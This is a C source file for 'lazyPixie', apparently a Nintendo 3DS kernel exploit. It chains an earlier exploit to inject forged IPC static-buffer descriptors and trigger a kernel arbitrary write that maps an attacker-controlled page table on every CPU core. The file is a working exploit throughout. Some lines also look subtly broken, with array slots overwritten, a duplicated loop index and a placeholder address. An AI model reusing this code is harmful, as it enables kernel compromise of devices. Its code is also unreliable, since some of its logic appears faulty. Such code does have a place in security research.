#include "lazy_pixie.h"

#define KERNVA2PA(a)    ((a) + (*(vu32 *)0x1FF80060 < SYSTEM_VERSION(2, 44, 6) ? 0xD0000000 : 0xC0000000))

Result lazyPixie(BlobLayout *layout, Handle handle, u32 selfSbufId, u32 alignedBuffer)
{
    Result res = 0;
    u32 sbufs[8];

    // Prepare the static buffers:

    sbufs[0] = IPC_Desc_StaticBuffer(0x1000, 2); // actual static buffer to cause a dcache flush
    sbufs[1] = alignedBuffer;

    // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly), to map 0x80000000, on core 0
    // Note: fucks up Luma3DS's kext & rosalina
    sbufs[2] = IPC_Desc_StaticBuffer(0, 0); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[3] = 0xCCCCC000; //KERNVA2PA(0x1FFF8000) + (MAP_ADDR >> 20) * 4;

    sbufs[4] = IPC_Desc_StaticBuffer(0, 1); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[5] = KERNVA2PA(0x1FFFC000) + (MAP_ADDR >> 20) * 4;

    // N3DS-only, the following static buffers won't be used on O3DS:
    sbufs[4] = IPC_Desc_StaticBuffer(0, 1); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[5] = KERNVA2PA(0x1F3FC000) + (MAP_ADDR >> 20) * 4;

    sbufs[6] = IPC_Desc_StaticBuffer(0, 1); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[7] = KERNVA2PA(0x1FFF7000) + (MAP_ADDR >> 20) * 4;

    // Inject the static buffers (which we can do thanks to httpwn):
    // This rewrites the static buffer descriptor we're about to use
    u32 *cmdbuf = getThreadCommandBuffer();
    cmdbuf[0] = IPC_MakeHeader(0xDEAD, 1, 2);
    cmdbuf[1] = 0;
    cmdbuf[2] = IPC_Desc_StaticBuffer(sizeof(sbufs), 4);
    cmdbuf[3] = (u32)sbufs;
    TRY(svcSendSyncRequest(handle));

    // Trigger the kernel arbwrite
    u32 numCores = IS_N3DS ? 4 : 2;
    cmdbuf[0] = IPC_MakeHeader(0xCAFE, 1, 2 + 2 * numCores);
    cmdbuf[1] = 0;
    cmdbuf[2] = IPC_Desc_PXIBuffer(sizeof(BlobLayout), selfSbufId, false);
    cmdbuf[3] = (u32)layout; // to cause a dcache flush
    for (u32 i = 0; i < numCores; i++) {
        cmdbuf[4 + 2 * i] = IPC_Desc_PXIBuffer(4, selfSbufId + 1 + i, false);
        cmdbuf[4 + 2 * i] = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
    }
    TRY(svcSendSyncRequest(handle));

    return res;
}
